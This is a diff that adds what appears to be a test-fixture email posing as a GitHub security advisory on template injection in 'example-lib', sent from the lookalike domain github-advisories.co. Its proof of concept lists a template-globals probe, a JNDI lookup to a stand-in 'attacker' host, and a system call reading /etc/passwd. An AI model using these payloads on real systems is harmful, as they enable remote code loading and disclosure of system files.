@@ -1,0 +1,16 @@
+From: GitHub Security <security@github-advisories.co>
+To: jatinsethi98@gmail.com
+Subject: [advisory] Template injection in example-lib < 2.1.4
+Date: Mon, 24 Aug 2026 07:30:00 +0000
+Message-ID: <ctl-control-04@github-advisories.co>
+MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+
+A template-injection vulnerability was found in example-lib.
+
+Proof of concept:
+  {{ config.__class__.__init__.__globals__ }}
+  ${jndi:ldap://attacker/x}
+  system("cat /etc/passwd")
+
+Upgrade to 2.1.4. Do not run untrusted templates.
